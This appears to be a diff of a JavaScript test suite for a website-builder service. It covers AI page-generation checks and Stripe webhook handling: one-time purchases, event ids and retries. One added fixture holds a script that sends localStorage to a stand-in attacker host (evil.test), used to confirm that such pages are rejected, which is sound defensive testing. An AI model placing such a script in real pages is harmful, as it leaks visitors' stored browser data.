@@ -564,6 +564,9 @@ check('and it is still their written page', rs.body.includes('Georgia,serif'));
 siteWriterReply = { stop_reason: 'end_turn', content: [{ type: 'text', text: '<!DOCTYPE html><html><head><title>x</title></head><body><img src="https://cdn.example.com/hero.jpg">' + 'y'.repeat(900) + '</body></html>' }] };
 r = await asAdmin({ action: 'site-write', slug: 'test-shop' });
 check('a page needing the network is rejected', r.code === 502 && /external resource/.test(r.body.message), JSON.stringify(r.body));
+siteWriterReply = { stop_reason: 'end_turn', content: [{ type: 'text', text: '<!DOCTYPE html><html><head><title>x</title></head><body><script>fetch("https://evil.test/?"+localStorage)</script>' + 'y'.repeat(900) + '</body></html>' }] };
+r = await asAdmin({ action: 'site-write', slug: 'test-shop' });
+check('a generated page with executable script is rejected', r.code === 502 && /executable script/.test(r.body.message), JSON.stringify(r.body));
 siteWriterReply = { stop_reason: 'refusal', content: [] };
 r = await asAdmin({ action: 'site-write', slug: 'test-shop' });
 check('a refusal is handled, not treated as a page', r.code === 502 && /declined/.test(r.body.message), JSON.stringify(r.body));
@@ -1097,7 +1100,7 @@ check('what they paid for is switched ON for their site',
 
 // The case that used to vanish entirely: a payment link that collected no email.
 seed();
-w = await hook({ type: 'checkout.session.completed', data: { object: { customer: 'cus_x', amount_total: 1900 } } });
+w = await hook({ type: 'checkout.session.completed', id: 'evt_no_email', data: { object: { customer: 'cus_x', amount_total: 1900 } } });
 check('a payment with no email still returns 200 rather than retrying forever', w.code === 200);
 check('and creates no junk account', Object.keys(accts()).length === 1, Object.keys(accts()).join(','));
 
@@ -1105,18 +1108,49 @@ check('and creates no junk account', Object.keys(accts()).length === 1, Object.k
 seed();
 seedAccounts({ [EMAIL]: { email: EMAIL, tokenNonce: NONCE, name: 'Test Shop', plan: ['P0', 'P3'], stripeCustomerId: 'cus_old' } });
 stripeSubs = [];
-w = await hook({ type: 'checkout.session.completed', data: { object: { customer: 'cus_old', customer_details: { email: EMAIL }, amount_total: 1900 } } });
+w = await hook({ type: 'checkout.session.completed', id: 'evt_existing', data: { object: { customer: 'cus_old', customer_details: { email: EMAIL }, amount_total: 1900 } } });
 check('an existing customer keeps their record', accts()[EMAIL].name === 'Test Shop' && accts()[EMAIL].plan.includes('P3'),
   JSON.stringify(accts()[EMAIL]));
 
 // Our own bug must never become a Stripe retry storm.
 seed();
-w = await hook({ type: 'checkout.session.completed', data: { object: { customer: 12345, customer_details: null } } });
-check('a malformed event is acknowledged, not retried for days', w.code === 200, 'got ' + w.code);
+w = await hook({ type: 'checkout.session.completed', id: 'evt_malformed', data: { object: { customer: 12345, customer_details: null } } });
+check('a malformed but non-actionable event is acknowledged', w.code === 200, 'got ' + w.code);
 
 seed();
-w = await hook({ type: 'customer.discount.created', data: { object: {} } });
+w = await hook({ type: 'customer.discount.created', id: 'evt_ignored', data: { object: {} } });
 check('an event we do not care about is acknowledged quietly', w.code === 200);
+
+// One-time payment links do not appear in Stripe subscriptions. Their line item
+// becomes permanent ownership on the account and must still switch on the site.
+const ONCE = 'oncebuyer@example.com';
+seed();
+w = await hook({
+  type: 'checkout.session.completed', id: 'evt_once',
+  data: { object: {
+    id: 'cs_once', mode: 'payment', payment_status: 'paid', customer: 'cus_once', amount_total: 14900,
+    customer_details: { email: ONCE, name: 'Once Buyer Electric' },
+    line_items: { data: [{ description: 'Online Booking & Scheduling', price: { id: 'price_once_booking', metadata: {} } }] },
+  } },
+});
+check('a one-time purchase is fulfilled', w.code === 200, 'got ' + w.code + ' ' + JSON.stringify(w.body));
+check('the one-time entitlement is stored permanently', accts()[ONCE].owned.includes('P3'), JSON.stringify(accts()[ONCE]));
+const onceSite = JSON.parse(KV.get('ks:site:once-buyer-electric'));
+check('a payment-link buyer gets a live site automatically', onceSite.published && onceSite.claimed);
+check('and the purchased module is switched on', onceSite.modules.includes('P3'), JSON.stringify(onceSite.modules));
+
+// A failed fulfillment returns non-2xx and releases its lock, so Stripe can retry.
+seed();
+const retryBase = {
+  type: 'checkout.session.completed', id: 'evt_retry_me',
+  data: { object: { id: 'cs_retry', mode: 'payment', customer: 'cus_retry', customer_details: { email: 'retry@example.com', name: 'Retry Shop' } } },
+};
+w = await hook(retryBase);
+check('unresolved paid fulfillment asks Stripe to retry', w.code === 500, 'got ' + w.code);
+retryBase.data.object.line_items = { data: [{ description: 'CRM & Customer Database', price: { id: 'price_once_crm', metadata: {} } }] };
+w = await hook(retryBase);
+check('the same event can succeed after the dependency recovers', w.code === 200, 'got ' + w.code);
+check('the successful retry records ownership', accts()['retry@example.com'].owned.includes('P5'));
 
 // ---------------------------------------------------------------------------
 // P4: the two claims that had no code behind them.
